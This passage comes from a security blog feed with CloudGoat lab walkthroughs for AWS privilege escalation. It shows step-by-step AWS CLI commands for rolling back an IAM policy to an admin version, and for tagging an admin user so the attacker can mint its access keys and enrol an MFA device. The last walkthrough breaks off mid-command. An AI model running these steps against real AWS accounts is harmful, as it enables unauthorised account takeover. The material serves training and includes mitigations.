class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>This confirms that the privilege escalation was successful.</p><h2 id="About-CloudTap"><a href="#About-CloudTap" class="headerlink" title="About CloudTap"></a>About CloudTap</h2><p><a href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a> is an automation tool designed to streamline the initial enumeration phase of AWS penetration testing. It assists in discovering permissions, roles, and potential privilege escalation paths, making it an invaluable tool for security assessments.</p><hr><p><em>Note: This walkthrough is based on the CloudGoat Lambda privilege escalation scenario and is intended for educational purposes only. Always ensure you have proper authorization before conducting any security testing.</em></p>]]></content>
      
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> CloudGoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cloudgoat-Iam_Privesc_by_Rollback</title>
      <link href="/2025/05/25/Cloudgoat-Iam-Privesc-by-Rollback/"/>
      <url>/2025/05/25/Cloudgoat-Iam-Privesc-by-Rollback/</url>
      
        <content type="html"><![CDATA[<h1 id="CloudGoat-—-IAM-Privilege-Escalation-by-Rollback-Complete-Walkthrough"><a href="#CloudGoat-—-IAM-Privilege-Escalation-by-Rollback-Complete-Walkthrough" class="headerlink" title="CloudGoat — IAM Privilege Escalation by Rollback (Complete Walkthrough)"></a>CloudGoat — IAM Privilege Escalation by Rollback (Complete Walkthrough)</h1><p>In this walkthrough, we’ll explore the CloudGoat scenario “iam_privesc_by_rollback”, which demonstrates how attackers can exploit IAM policy versioning to escalate privileges in AWS environments. This scenario teaches us how previous policy versions with elevated permissions can be restored to achieve administrative access through the SetDefaultPolicyVersion permission.</p><h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p>Begin by configuring CloudGoat and whitelisting your IP address to ensure proper connectivity to the AWS environment.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat config whitelist --auto</span><br></pre></td></tr></table></figure><p>Create the IAM privilege escalation scenario using the following command:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat create iam_privesc_by_rollback</span><br></pre></td></tr></table></figure><p>Upon successful deployment, you’ll receive initial AWS credentials for the scenario:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws_access_key_id = [REDACTED]</span><br><span class="line">aws_secret_access_key = [REDACTED]</span><br><span class="line">aws_account_id = [REDACTED]</span><br></pre></td></tr></table></figure><hr><h2 id="Reconnaissance-and-Enumeration"><a href="#Reconnaissance-and-Enumeration" class="headerlink" title="Reconnaissance and Enumeration"></a>Reconnaissance and Enumeration</h2><p>The first step in any AWS penetration test involves thorough enumeration to understand available permissions and resources. Using automated enumeration tools can significantly speed up this process <a href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 aws_auditor.py</span><br></pre></td></tr></table></figure><p>The enumeration reveals an attached IAM policy with specific permissions:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Statement&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Sid&quot;: &quot;IAMPrivilegeEscalationByRollback&quot;,</span><br><span class="line">      &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">      &quot;Action&quot;: [</span><br><span class="line">        &quot;iam:Get*&quot;,</span><br><span class="line">        &quot;iam:List*&quot;,</span><br><span class="line">        &quot;iam:SetDefaultPolicyVersion&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;Resource&quot;: &quot;*&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Policy-Version-Analysis"><a href="#Policy-Version-Analysis" class="headerlink" title="Policy Version Analysis"></a>Policy Version Analysis</h2><p>The key to this privilege escalation lies in examining policy versions. The iam:SetDefaultPolicyVersion permission combined with read access suggests potential for policy rollback attacks.</p><p>List all available policy versions:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam list-policy-versions --policy-arn arn:aws:iam::ACCOUNT:policy/POLICY-NAME --profile init</span><br></pre></td></tr></table></figure><p>This command reveals multiple policy versions:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;Versions&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;VersionId&quot;: &quot;v5&quot;,</span><br><span class="line">            &quot;IsDefaultVersion&quot;: false,</span><br><span class="line">            &quot;CreateDate&quot;: &quot;2025-05-24T21:58:04+00:00&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;VersionId&quot;: &quot;v4&quot;,</span><br><span class="line">            &quot;IsDefaultVersion&quot;: false,</span><br><span class="line">            &quot;CreateDate&quot;: &quot;2025-05-24T21:57:58+00:00&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;VersionId&quot;: &quot;v3&quot;,</span><br><span class="line">            &quot;IsDefaultVersion&quot;: false,</span><br><span class="line">            &quot;CreateDate&quot;: &quot;2025-05-24T21:57:52+00:00&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;VersionId&quot;: &quot;v2&quot;,</span><br><span class="line">            &quot;IsDefaultVersion&quot;: false,</span><br><span class="line">            &quot;CreateDate&quot;: &quot;2025-05-24T21:57:45+00:00&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;VersionId&quot;: &quot;v1&quot;,</span><br><span class="line">            &quot;IsDefaultVersion&quot;: true,</span><br><span class="line">            &quot;CreateDate&quot;: &quot;2025-05-24T21:57:39+00:00&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Examine each policy version to identify versions with elevated privileges. Version 3 contains the administrative permissions we’re looking for:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/POLICY-NAME --version-id v3 --profile init</span><br></pre></td></tr></table></figure><p>The policy version reveals full administrative access:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;PolicyVersion&quot;: &#123;</span><br><span class="line">        &quot;Document&quot;: &#123;</span><br><span class="line">            &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">            &quot;Statement&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Action&quot;: &quot;*&quot;,</span><br><span class="line">                    &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">                    &quot;Resource&quot;: &quot;*&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;VersionId&quot;: &quot;v3&quot;,</span><br><span class="line">        &quot;IsDefaultVersion&quot;: false,</span><br><span class="line">        &quot;CreateDate&quot;: &quot;2025-05-24T22:08:15+00:00&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Execute the privilege escalation by setting the administrative policy version as default:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aws iam set-default-policy-version \</span><br><span class="line">  --policy-arn arn:aws:iam::ACCOUNT:policy/POLICY-NAME \</span><br><span class="line">  --version-id v3 \</span><br><span class="line">  --profile init</span><br></pre></td></tr></table></figure><p>Also now the new version for <a href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a> includes managed policy versioning handling!</p><h2 id="Impact-and-Verification"><a href="#Impact-and-Verification" class="headerlink" title="Impact and Verification"></a>Impact and Verification</h2><p>After successfully rolling back to the administrative policy version, you now possess full AWS administrative privileges. This escalation allows complete control over the AWS environment, including the ability to create new users, modify existing policies, access sensitive resources, and perform any administrative action.<br>Mitigation Strategies</p><h2 id="Organizations-should-implement-several-controls-to-prevent-IAM-privilege-escalation-through-policy-rollback"><a href="#Organizations-should-implement-several-controls-to-prevent-IAM-privilege-escalation-through-policy-rollback" class="headerlink" title="Organizations should implement several controls to prevent IAM privilege escalation through policy rollback:"></a>Organizations should implement several controls to prevent IAM privilege escalation through policy rollback:</h2><pre><code>- Policy Version Management: Regularly audit and remove unnecessary policy versions, especially those containing elevated privileges- Least Privilege Principle: Avoid granting iam:SetDefaultPolicyVersion permission unless absolutely necessary- Monitoring and Alerting: Implement CloudTrail monitoring for policy version changes and privilege escalation activities- Access Reviews: Conduct regular reviews of IAM policies and their version histories- Automation: Use infrastructure as code to maintain consistent policy configurations</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> CloudGoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cloudgoat-Iam_Privesc_by_Key_Rotation</title>
      <link href="/2025/05/24/Cloudgoat-Iam-Privesc-by-Key-Rotation/"/>
      <url>/2025/05/24/Cloudgoat-Iam-Privesc-by-Key-Rotation/</url>
      
        <content type="html"><![CDATA[<h1 id="CloudGoat-IAM-Privilege-Escalation-by-Key-Rotation-Complete-Walkthrough"><a href="#CloudGoat-IAM-Privilege-Escalation-by-Key-Rotation-Complete-Walkthrough" class="headerlink" title="CloudGoat IAM Privilege Escalation by Key Rotation - Complete Walkthrough"></a>CloudGoat IAM Privilege Escalation by Key Rotation - Complete Walkthrough</h1><p>In this walkthrough, we’ll explore the CloudGoat scenario “iam_privesc_by_key_rotation”, which demonstrates a common AWS privilege escalation technique involving IAM user tagging and access key manipulation. This scenario teaches us how misconfigured IAM policies can lead to complete account compromise.</p><h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p>First, let’s set up our CloudGoat environment and whitelist our IP address:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat config whitelist --auto</span><br></pre></td></tr></table></figure><p>Now we can create the vulnerable environment:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat create iam_privesc_by_key_rotation</span><br></pre></td></tr></table></figure><p>After successful deployment, you’ll receive initial credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws_account_id = [REDACTED]</span><br><span class="line">manager_access_key_id = [REDACTED]</span><br><span class="line">manager_secret_access_key = [REDACTED]</span><br></pre></td></tr></table></figure><h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>I’ll use my custom AWS enumeration tool <a href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a> to gather information about our current permissions. The tool reveals several interesting inline policies attached to our user.</p><h3 id="Policy-Analysis"><a href="#Policy-Analysis" class="headerlink" title="Policy Analysis"></a>Policy Analysis</h3><p>The reconnaissance reveals three critical policies:</p><ol><li>IAM Read Permissions</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;iam:GenerateCredentialReport&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:GenerateServiceLastAccessedDetails&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:Get*&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:List*&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:SimulateCustomPolicy&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:SimulatePrincipalPolicy&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>Tag Management Policy</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TagResources&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;iam:UntagUser&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:UntagRole&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:TagRole&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:UntagMFADevice&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:UntagPolicy&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:TagMFADevice&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:TagPolicy&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:TagUser&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>Self-Management Policy (The Key Vulnerability)</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SelfManageAccess&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;iam:DeactivateMFADevice&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:GetMFADevice&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:EnableMFADevice&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:ResyncMFADevice&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:DeleteAccessKey&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:UpdateAccessKey&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;iam:CreateAccessKey&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iam::ACCOUNT-ID:user/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iam::ACCOUNT-ID:mfa/*&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;StringEquals&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;aws:ResourceTag/developer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="The-Attack-Vector"><a href="#The-Attack-Vector" class="headerlink" title="The Attack Vector"></a>The Attack Vector</h2><p>The vulnerability lies in the combination of these policies:</p><ol><li>We can tag any user with <code>TagUser</code> permission</li><li>We can create access keys for users tagged with <code>developer=true</code></li><li>The resource condition allows access to any user with the developer tag</li></ol><h2 id="Exploitation-Phase"><a href="#Exploitation-Phase" class="headerlink" title="Exploitation Phase"></a>Exploitation Phase</h2><h3 id="Step-1-Configure-AWS-Profile"><a href="#Step-1-Configure-AWS-Profile" class="headerlink" title="Step 1: Configure AWS Profile"></a>Step 1: Configure AWS Profile</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws configure --profile manager</span><br></pre></td></tr></table></figure><p>Verify our current identity:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity --profile manager</span><br></pre></td></tr></table></figure><h3 id="Step-2-Find-Target-Users"><a href="#Step-2-Find-Target-Users" class="headerlink" title="Step 2: Find Target Users"></a>Step 2: Find Target Users</h3><p>List all users in the account to find potential targets:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam list-users --profile manager</span><br></pre></td></tr></table></figure><p>We discover an admin user: <code>admin_cgidXXXXXXXXXX</code></p><h3 id="Step-3-Tag-the-Target-User"><a href="#Step-3-Tag-the-Target-User" class="headerlink" title="Step 3: Tag the Target User"></a>Step 3: Tag the Target User</h3><p>Apply the developer tag to the admin user:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam tag-user   --user-name admin_cgidXXXXXXXXXX   --tags Key=developer,Value=true   --profile manager</span><br></pre></td></tr></table></figure><h3 id="Step-4-Handle-Access-Key-Limits"><a href="#Step-4-Handle-Access-Key-Limits" class="headerlink" title="Step 4: Handle Access Key Limits"></a>Step 4: Handle Access Key Limits</h3><p>Attempt to create a new access key:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam create-access-key   --user-name admin_cgidXXXXXXXXXX   --profile manager</span><br></pre></td></tr></table></figure><p>If you encounter a quota error (users can only have 2 access keys), list existing keys:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam list-access-keys   --user-name admin_cgidXXXXXXXXXX   --profile manager</span><br></pre></td></tr></table></figure><p>Delete one of the inactive keys:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam delete-access-key   --user-name admin_cgidXXXXXXXXXX   --access-key-id [INACTIVE-KEY-ID]   --profile manager</span><br></pre></td></tr></table></figure><h3 id="Step-5-Create-New-Access-Key"><a href="#Step-5-Create-New-Access-Key" class="headerlink" title="Step 5: Create New Access Key"></a>Step 5: Create New Access Key</h3><p>Now create a new access key for the admin user:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam create-access-key   --user-name admin_cgidXXXXXXXXXX   --profile manager</span><br></pre></td></tr></table></figure><p>Success! We now have admin credentials.</p><h2 id="Admin-Account-Enumeration"><a href="#Admin-Account-Enumeration" class="headerlink" title="Admin Account Enumeration"></a>Admin Account Enumeration</h2><p>Configure a new profile with the admin credentials and enumerate permissions:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws configure --profile admin</span><br></pre></td></tr></table></figure><p>Using our enumeration tool reveals an additional policy allowing role assumption:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AssumeRole&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sts:AssumeRole&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::ACCOUNT-ID:role/cg_secretsmanager_cgidXXXXXXXXXX&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>However, examining the role’s trust policy reveals an MFA requirement:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::ACCOUNT-ID:root&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sts:AssumeRole&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Bool&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;aws:MultiFactorAuthPresent&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="MFA-Setup-and-Bypass"><a href="#MFA-Setup-and-Bypass" class="headerlink" title="MFA Setup and Bypass"></a>MFA Setup and Bypass</h2><h3 id="Step-1-Create-Virtual-MFA-Device"><a href="#Step-1-Create-Virtual-MFA-Device" class="headerlink" title="Step 1: Create Virtual MFA Device"></a>Step 1: Create Virtual MFA Device</h3><p>Using our manager account (which has MFA management permissions):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam create-virtual-mfa-device   --virtual-mfa-device-name admin-mfa   --outfile /tmp/admin-mfa-qr.png   --bootstrap-method QRCodePNG   --profile manager</span><br></pre></td></tr></table></figure><h3 id="Step-2-Enable-MFA-Device"><a href="#Step-2-Enable-MFA-Device" class="headerlink" title="Step 2: Enable MFA Device"></a>Step 2: Enable MFA Device</h3><p>Scan the QR code with an authenticator app, then enable the device:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam enable-mfa-device   --user-name admin_cgidXXXXXXXXXX   --serial-number arn:aws:iam::ACCOUNT-ID:mfa/admin-mfa   --authentication-code1 [CODE1]   --authentication-code2 